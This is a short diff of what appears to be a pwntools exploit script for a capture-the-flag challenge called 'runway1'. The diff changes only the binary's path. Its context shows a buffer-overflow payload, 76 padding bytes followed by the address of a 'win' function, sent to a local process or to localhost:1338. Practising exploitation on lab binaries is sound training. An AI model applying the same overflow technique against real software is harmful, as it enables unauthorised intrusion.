@@ -11,13 +11,13 @@ context(arch="amd64", endian='el', os="linux")
 context.log_level = "debug"
 
 if args.mode in ["d", "debug"]:
-    p = process('./runway1')
+    p = process('../bin/runway1')
     #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
 else:
     p = remote('localhost', 1338)
     #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
 
-chall = ELF('./runway1', checksec=True)
+chall = ELF('../bin/runway1', checksec=True)
 
 pd = b'A' * 76
 pd += p32(chall.sym['win'])
